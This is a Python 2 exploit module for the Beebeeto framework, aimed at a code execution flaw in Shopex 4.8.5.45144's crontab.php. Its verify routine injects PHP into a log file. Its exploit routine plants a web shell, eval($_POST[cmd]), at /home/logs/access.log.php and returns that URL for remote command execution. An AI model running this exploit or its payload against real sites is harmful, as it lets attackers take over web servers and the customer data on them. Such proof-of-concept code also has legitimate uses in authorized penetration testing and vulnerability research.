#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0107',
            'name': 'Shopex 4.8.5.45144 /core/include_v5/crontab.php 代码执行漏洞 POC & Exploit',
            'author': 'H4rdy',
            'create_date': '2014-10-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Shopex',
            'vul_version': ['4.8.5.45144'],
            'type': 'Code Execution',
            'tag': ['Shopex漏洞', '代码执行漏洞', '/core/include_v5/crontab.php', 'php'],
            'desc': '\core\include_v5\crontab.php中$this没任何过滤就将错误写入日志文件,且只对linux服务器有用',
            'references': ['http://sebug.net/vuldb/ssvid-19798',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = """/?cron=1&action=1&p=1<?php%20echo%20md5(3.1415)?>"""
        shell_url = args['options']['target'] + '/home/logs/access.log.php'
        verify_url = args['options']['target'] + payload
        verify_req = urllib2.Request(verify_url)
        shell_req = urllib2.Request(shell_url)
        verify_response = urllib2.urlopen(verify_url)
        shell_response = urllib2.urlopen(shell_req)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Request URL2 ' + shell_url
        content = urllib2.urlopen(shell_url).read()
        if "63e1f04640e83605c1d177544a5a0488" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        payload ="""/?cron=1&action=1&p=1<?php%20echo%20md5(3.14);eval($_POST[cmd]);?>"""
        shell_url = args['options']['target']+'/home/logs/access.log.php'
        verify_url = args['options']['target'] + payload
        verify_req = urllib2.Request(verify_url)
        shell_req = urllib2.Request(shell_url)
        verify_response = urllib2.urlopen(verify_req)
        shell_response = urllib2.urlopen(shell_req)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Request URL2 ' + shell_url
        content = urllib2.urlopen(shell_url).read()
        if "4beed3b9c4a886067de0e3a094246f78" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = shell_url
            args['poc_ret']['conect'] = """<?php%20echo%20md5(3.14);eval($_POST[cmd]);?>"""
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())